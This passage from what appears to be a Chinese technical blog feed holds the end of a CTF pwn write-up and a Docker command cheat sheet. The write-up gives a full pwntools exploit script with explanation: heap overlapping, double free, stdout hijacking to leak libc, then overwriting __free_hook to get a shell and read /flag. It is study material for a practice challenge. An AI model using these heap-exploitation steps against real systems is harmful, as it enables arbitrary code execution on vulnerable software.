class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x171</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x100</span>), <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x100</span>+<span class="number">0x70</span>))</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 构造同一个 chunk 的 UAF (两大小不同的堆块控制)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0xf0</span>)<span class="comment">##chunk 9 == chunk 10</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br><span class="line"><span class="comment"># 3. 将一个放入 tcahebin ,一个放入 unsortedbin 中, 让 tcahebin-&gt;next 为 libc 相关</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x50</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x61</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x101</span>),<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># # 于是，有了：0x60 [  1]: 0x55555555bad0 —▸ 0x7ffff7fc1be0 (main_arena+96)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 4. 测试, 爆破 _IO_2_1_stdout_ 的地址，成功概率 1/16</span></span><br><span class="line"><span class="comment"># # pwndbg&gt; p &amp;_IO_2_1_stdout_</span></span><br><span class="line"><span class="comment"># # $1 = (struct _IO_FILE_plus *) 0x7ffff7fc26a0 &lt;_IO_2_1_stdout_&gt;</span></span><br><span class="line"><span class="comment"># 由于会 sprintf 会追加 &#x27;\x00&#x27;, 这里用后面的 read</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(12, b&#x27;%p&#x27;*0x11+b&#x27;1&#x27;*10, b&#x27;\x00&#x27;)</span></span><br><span class="line">edit(<span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">166</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;11111&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x58</span>+<span class="string">b&#x27;\x90\x26&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">14</span>, <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span> + p32(<span class="number">0xFBAD1800</span>) + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x25</span>-<span class="number">8</span>))</span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">data = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&#x27;data&#x27;</span>,data)</span><br><span class="line">libc_base = data - <span class="number">0x1ec980</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">leak(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">leak(<span class="string">&quot;system_addr&quot;</span>,system_addr)</span><br><span class="line">leak(<span class="string">&quot;one_gadget&quot;</span>,one_gadget)</span><br><span class="line"><span class="comment"># 5.getshell</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+ p64(free_hook-<span class="number">0x10</span>), <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(one_gadget),<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b<span class="string">&#x27;ls\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x25 bytes:</span><br><span class="line">    b<span class="string">&#x27;exp.py\tld-2.31.so  libc-2.31.so  pwn\n&#x27;</span></span><br><span class="line">exp.py    ld-2.31.so  libc-2.31.so  pwn</span><br><span class="line">$ <span class="built_in">cat</span> /flag</span><br><span class="line">[DEBUG] Sent 0xa bytes:</span><br><span class="line">    b<span class="string">&#x27;cat /flag\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x1a bytes:</span><br><span class="line">    b<span class="string">&#x27;flag&#123;this_is_a_test_flag&#125;\n&#x27;</span></span><br><span class="line">flag&#123;this_is_a_test_flag&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h2 id="exp分析"><a href="#exp分析" class="headerlink" title="exp分析"></a>exp分析</h2><p><strong>exp思路理解分析：</strong></p>
<ol>
<li>这道题没有show()函数就不能像正常那样泄露地址，所以我们要劫持stdout</li>
<li>劫持stdout也需要libc地址，那么我们就需要将libc地址想办法布置到tcachebins中的next指针（或者其它）</li>
<li>存在堆溢出，可以通过overlapping来制造doubel free(同一个chunk即在tcache中，又在unsortedbin中)，从而实现申请一个堆块在stdout附近</li>
<li>最后，通过one_gadget等方式来getshell</li>
</ol>
<h3 id="unlink-合并到-top-chunk"><a href="#unlink-合并到-top-chunk" class="headerlink" title="unlink 合并到 top chunk"></a>unlink 合并到 top chunk</h3><p>unlink 合并到 top chunk(overlapping)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. unlink 合并到 top chunk (overlapping)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x171</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x100</span>), <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x100</span>+<span class="number">0x70</span>))</span><br><span class="line">delete(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<p>我们的目标是让chunk 9实现double free</p>
<p>这里通过堆溢出制造overlapping_chunk9将chunk8 - 10都放入top chunk中</p>
<h3 id="构造同一个-chunk-的-UAF"><a href="#构造同一个-chunk-的-UAF" class="headerlink" title="构造同一个 chunk 的 UAF"></a>构造同一个 chunk 的 UAF</h3><p>构造同一个 chunk 的 UAF(两大小不同的堆块控制)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2. 构造同一个 chunk 的 UAF (两大小不同的堆块控制)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0xf0</span>)<span class="comment">##chunk 9 == chunk 10</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure>

<p>这里就是再将top chunk中的chunk 9再次申请出来，我们通过一给chunk就控制了chunklist中两个chunk</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x555555554000+0x4060</span><br><span class="line">0x555555558060: 0x000055555555b8a0      0x000055555555b7a0</span><br><span class="line">0x555555558070: 0x000055555555b6a0      0x000055555555b5a0</span><br><span class="line">0x555555558080: 0x000055555555b4a0      0x000055555555b3a0</span><br><span class="line">0x555555558090: 0x000055555555b2a0      0x000055555555b9a0</span><br><span class="line">0x5555555580a0: 0x000055555555ba70      0x000055555555bad0</span><br><span class="line"><span class="comment">#               chunk 10                 chunk 9   </span></span><br><span class="line">0x5555555580b0: 0x000055555555bad0      0x000055555555bbd0</span><br><span class="line">0x5555555580c0: 0x000055555555b9d0      0x0000000000000000</span><br><span class="line">0x5555555580d0: 0x0000000000000000      0x0000000000000000                                               </span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>将一个放入 tcahebin ,一个放入 unsortedbin 中, 让 tcahebin-&gt;next 为 libc 相关</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">13</span>,<span class="number">0x50</span>)<span class="comment">#这个是为了让tcachebins中0x60处next指针有效（即有两个以上的chunk）</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x61</span>), <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(<span class="number">0x101</span>),<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>

<p>我们直接进行delete(9)和delete(10)一样也会被检测出来double free；</p>
<p>所以可以通过修改chunk 9和chunk 10的大小，再进行free，是他们一个进入tcachebins中，一个进入unsortedbins中。</p>
<p>这也就实现了我们的目的，在tcahebins中的那个chunk的next指针上留下了libc地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x60 [  2]: 0x55555555bad0 —▸ 0x7ffff7fc1be0 —▸ 0x55555555bd40 ◂— ...</span><br><span class="line">0x100 [  7]: 0x55555555b2a0 —▸ 0x55555555b3a0 —▸ 0x55555555b4a0 —▸ 0x55555555b5a0 —▸ 0x55555555b6a0 —▸ 0x55555555b7a0 —▸ 0x55555555b8a0 ◂— 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55555555bac0 —▸ 0x7ffff7fc1be0 ◂— 0x55555555bac0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="hijack-stdout"><a href="#hijack-stdout" class="headerlink" title="hijack stdout"></a>hijack stdout</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # 4. 测试, 爆破 _IO_2_1_stdout_ 的地址，成功概率 1/16</span></span><br><span class="line"><span class="comment"># # pwndbg&gt; p &amp;_IO_2_1_stdout_</span></span><br><span class="line"><span class="comment"># # $1 = (struct _IO_FILE_plus *) 0x7ffff7fc26a0 &lt;_IO_2_1_stdout_&gt;</span></span><br><span class="line"><span class="comment"># 由于会 sprintf 会追加 &#x27;\x00&#x27;, 这里用后面的 read</span></span><br><span class="line"><span class="comment">#edit(12, b&#x27;%p&#x27;*0x11+b&#x27;1&#x27;*10, b&#x27;\x00&#x27;)</span></span><br><span class="line">edit(<span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa5</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;11111&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x58</span>+<span class="string">b&#x27;\x90\x26&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">14</span>, <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span> + p32(<span class="number">0xfbad1800</span>) + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x25</span>-<span class="number">8</span>))</span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">data = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&#x27;data&#x27;</span>,data)</span><br><span class="line">libc_base = data - <span class="number">0x1ec980</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">leak(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">leak(<span class="string">&quot;system_addr&quot;</span>,system_addr)</span><br><span class="line">leak(<span class="string">&quot;one_gadget&quot;</span>,one_gadget)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里为什么是0xa5？</p>
<p>这里的0xa5恰好可以将下面的chunk8的old_chunk_size覆盖为一个不大不小的数 0x0000006161616161 太大了会出问题(如果全覆盖的话read好像字节数太多了读取不了)</p>
<p>会导致这里的\x90\x26无法写入</p>
<p>需要把chunk8的人工size填充为一个大小合理的值，否则太大了read读取不了，太小了又不够覆盖</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa5</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>篡改了chunk 8的old_chunk_size，是他可以直接写入大量数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;11111&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x58</span>+<span class="string">b&#x27;\x90\x26&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这个是改了chunk 9的next指针低位，使它概率指向 stdout - 0x10 的地方</p>
<p>申请出 stdout - 0x10 的地方，改 stdout 的<code>_flag</code>为 0xfbad1800，和 write_base_ptr 的低位为 00，实现泄露出libc地址</p>
<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 5.getshell</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+ p64(free_hook-<span class="number">0x10</span>), <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(one_gadget),<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">itr()</span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x50</span>+p64(free_hook-<span class="number">0x10</span>), <span class="string">b&#x27;*&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span> + p64(system_addr), <span class="string">b&#x27;*&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x50</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="string">b&#x27;*&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>用上前面申请的0x40的3个 chunk 改 free_hook 为 one_gadget 或改 free_hook 为 system_addr 来 get shell</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>unlink还可以这样用，有点类似house of botcake…</p>
<h1 id="prompt"><a href="#prompt" class="headerlink" title="prompt"></a>prompt</h1><h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ol>
<li><a href="https://blog.csdn.net/a19106051385/article/details/146318753">https://blog.csdn.net/a19106051385/article/details/146318753</a></li>
<li><a href="https://mp.weixin.qq.com/s/0e8avtn3o_jZJbh3UDUdzw">https://mp.weixin.qq.com/s/0e8avtn3o_jZJbh3UDUdzw</a></li>
<li><a href="https://mp.weixin.qq.com/s/Ygg4bm9y27vskWyxFR2vOw">https://mp.weixin.qq.com/s/Ygg4bm9y27vskWyxFR2vOw</a></li>
<li><a href="https://blog.csdn.net/XiDPPython/article/details/146384414">https://blog.csdn.net/XiDPPython/article/details/146384414</a></li>
</ol>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>docker常用命令</title>
    <url>/2025/07/16/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>好的，没问题！这是一份为您精心整理的 Docker 常用命令大全，按照功能进行了分类，并附上了最常用的选项和示例。您可以把它当作一个速查手册。</p>
<h3 id="一、-镜像管理-Image-Management"><a href="#一、-镜像管理-Image-Management" class="headerlink" title="一、 镜像管理 (Image Management)"></a>一、 镜像管理 (Image Management)</h3><p>镜像是创建容器的基础。</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>docker pull</code></td>
<td align="left">从 Docker Hub 或其他镜像仓库拉取一个镜像</td>
<td align="left"><code>docker pull nginx:latest</code></td>
</tr>
<tr>
<td align="left"><code>docker images</code></td>
<td align="left">列出本地已经下载的所有镜像</td>
<td align="left"><code>docker images</code></td>
</tr>
<tr>
<td align="left"><code>docker rmi</code></td>
<td align="left">删除一个或多个本地镜像</td>
<td align="left"><code>docker rmi ubuntu:18.04</code></td>
</tr>
<tr>
<td align="left"><code>docker rmi -f</code></td>
<td align="left">强制删除一个镜像（即使有容器在使用它）</td>
<td align="left"><code>docker rmi -f my-image</code></td>
</tr>
<tr>
<td align="left"><code>docker build</code></td>
<td align="left">从 Dockerfile 构建一个新镜像</td>
<td align="left"><code>docker build -t my-app:1.0 .</code></td>
</tr>
<tr>
<td align="left"><code>docker history</code></td>
<td align="left">查看镜像的构建历史（各层信息）</td>
<td align="left"><code>docker history nginx</code></td>
</tr>
<tr>
<td align="left"><code>docker save</code></td>
<td align="left">将一个镜像保存成 tar 归档文件</td>
<td align="left"><code>docker save -o nginx.tar nginx:latest</code></td>
</tr>
<tr>
<td align="left"><code>docker load</code></td>
<td align="left">从 tar 归档文件加载一个镜像</td>
<td align="left"><code>docker load -i nginx.tar</code></td>
</tr>
</tbody></table>
<hr>
<h3 id="二、-容器生命周期-Container-Lifecycle"><a href="#二、-容器生命周期-Container-Lifecycle" class="headerlink" title="二、 容器生命周期 (Container Lifecycle)"></a>二、 容器生命周期 (Container Lifecycle)</h3><p>容器是镜像的运行实例。</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>docker run</code></td>
<td align="left">基于一个镜像创建并启动一个新容器</td>
<td align="left"><code>docker run -d -p 8080:80 --name my-web nginx</code></td>
</tr>
<tr>
<td align="left"><code>docker ps</code></td>
<td align="left">列出所有<strong>正在运行</strong>的容器</td>
<td align="left"><code>docker ps</code></td>
</tr>
<tr>
<td align="left"><code>docker ps -a</code></td>
<td align="left">列出<strong>所有</strong>的容器（包括已停止的）</td>
<td align="left"><code>docker ps -a</code></td>
</tr>
<tr>
<td align="left"><code>docker stop</code></td>
<td align="left">优雅地停止一个正在运行的容器（发送 SIGTERM）</td>
<td align="left"><code>docker stop my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker kill</code></td>
<td align="left">强制停止一个正在运行的容器（发送 SIGKILL）</td>
<td align="left"><code>docker kill my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker start</code></td>
<td align="left">启动一个已经停止的容器</td>
<td align="left"><code>docker start my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker restart</code></td>
<td align="left">重启一个容器</td>
<td align="left"><code>docker restart my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker rm</code></td>
<td align="left">删除一个或多个<strong>已停止</strong>的容器</td>
<td align="left"><code>docker rm my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker rm -f</code></td>
<td align="left">强制删除一个容器（即使它在运行中）</td>
<td align="left"><code>docker rm -f my-web</code></td>
</tr>
</tbody></table>
<h4 id="docker-run-的常用选项："><a href="#docker-run-的常用选项：" class="headerlink" title="docker run 的常用选项："></a><code>docker run</code> 的常用选项：</h4><ul>
<li><code>-d</code> (<code>--detach</code>): 后台运行容器（守护式运行）。</li>
<li><code>-p</code> (<code>--publish</code>): 端口映射，格式为 <code>主机端口:容器端口</code>。</li>
<li><code>-v</code> (<code>--volume</code>): 数据卷挂载，格式为 <code>主机路径:容器路径</code>。</li>
<li><code>--name</code>: 为容器指定一个易于记忆的名称。</li>
<li><code>-it</code> (<code>--interactive --tty</code>): 以交互模式进入容器的终端。</li>
<li><code>--rm</code>: 容器退出时自动删除容器，适合临时任务。</li>
</ul>
<hr>
<h3 id="三、-容器操作与监控-Container-Operations"><a href="#三、-容器操作与监控-Container-Operations" class="headerlink" title="三、 容器操作与监控 (Container Operations)"></a>三、 容器操作与监控 (Container Operations)</h3><p>管理和查看正在运行的容器。</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>docker exec</code></td>
<td align="left">在一个正在运行的容器内部执行命令</td>
<td align="left"><code>docker exec -it my-web /bin/bash</code></td>
</tr>
<tr>
<td align="left"><code>docker logs</code></td>
<td align="left">查看容器的日志输出</td>
<td align="left"><code>docker logs my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker logs -f</code></td>
<td align="left">实时跟踪查看容器的日志（类似 <code>tail -f</code>）</td>
<td align="left"><code>docker logs -f my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker inspect</code></td>
<td align="left">查看容器&#x2F;镜像的底层详细信息（如 IP 地址）</td>
<td align="left"><code>docker inspect my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker stats</code></td>
<td align="left">实时显示容器的资源使用情况（CPU, 内存等）</td>
<td align="left"><code>docker stats</code></td>
</tr>
<tr>
<td align="left"><code>docker cp</code></td>
<td align="left">在主机和容器之间复制文件或文件夹</td>
<td align="left"><code>docker cp ./index.html my-web:/usr/share/nginx/html/</code></td>
</tr>
</tbody></table>
<hr>
<h3 id="四、-系统清理-System-Cleanup"><a href="#四、-系统清理-System-Cleanup" class="headerlink" title="四、 系统清理 (System Cleanup)"></a>四、 系统清理 (System Cleanup)</h3><p>清理不再使用的 Docker 资源，释放磁盘空间。</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>docker system prune</code></td>
<td align="left"><strong>一键清理！</strong> 删除所有已停止的容器、悬空镜像、不用的网络和构建缓存。</td>
</tr>
<tr>
<td align="left"><code>docker system prune -a</code></td>
<td align="left"><strong>更彻底！</strong> 在<code>prune</code>基础上，额外删除所有未被任何容器使用的镜像。</td>
</tr>
<tr>
<td align="left"><code>docker rm $(docker ps -a -q)</code></td>
<td align="left"><strong>手动清理：</strong> 删除所有容器（无论状态）。</td>
</tr>
<tr>
<td align="left"><code>docker rmi $(docker images -q)</code></td>
<td align="left"><strong>手动清理：</strong> 删除所有本地镜像（请谨慎！）。</td>
</tr>
</tbody></table>
<p><strong>⚠️ 警告：</strong> 清理命令是破坏性的，执行前请三思。</p>
<hr>
<h3 id="五、-Docker-Compose-多容器应用"><a href="#五、-Docker-Compose-多容器应用" class="headerlink" title="五、 Docker Compose (多容器应用)"></a>五、 Docker Compose (多容器应用)</h3><p>用于定义和运行多容器 Docker 应用程序的工具。通常所有配置都在 <code>docker-compose.yml</code> 文件中。</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>docker-compose up</code></td>
<td align="left">根据 <code>docker-compose.yml</code> 创建并启动所有服务（前台运行）。</td>
</tr>
<tr>
<td align="left"><code>docker-compose up -d</code></td>
<td align="left">在后台创建并启动所有服务。</td>
</tr>
<tr>
<td align="left"><code>docker-compose down</code></td>
<td align="left">停止并删除由 <code>up</code> 创建的容器、网络。</td>
</tr>
<tr>
<td align="left"><code>docker-compose down -v</code></td>
<td align="left">在 <code>down</code> 的基础上，同时删除定义的数据卷。</td>
</tr>
<tr>
<td align="left"><code>docker-compose ps</code></td>
<td align="left">列出 Compose 项目中的所有容器。</td>
</tr>
<tr>
<td align="left"><code>docker-compose logs</code></td>
<td align="left">查看所有服务的日志。</td>
</tr>
<tr>
<td align="left"><code>docker-compose logs -f</code></td>
<td align="left">实时跟踪所有服务的日志。</td>
</tr>
<tr>
<td align="left"><code>docker-compose build</code></td>
<td align="left">构建或重新构建项目中的服务镜像。</td>
</tr>
<tr>
<td align="left"><code>docker-compose exec</code></td>
<td align="left">进入某个正在运行的服务容器内部。<code>docker-compose exec web /bin/bash</code></td>
</tr>
</tbody></table>
<p>希望这份清单能对您有所帮助！</p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn刷题</title>
    <url>/2025/04/27/ctfshow/</url>
    <content><![CDATA[<h1 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h1><h2 id="pwn70-不可见字符"><a href="#pwn70-不可见字符" class="headerlink" title="pwn70 不可见字符"></a>pwn70 不可见字符</h2><p>orw + 不可见字符绕过strlen()</p>
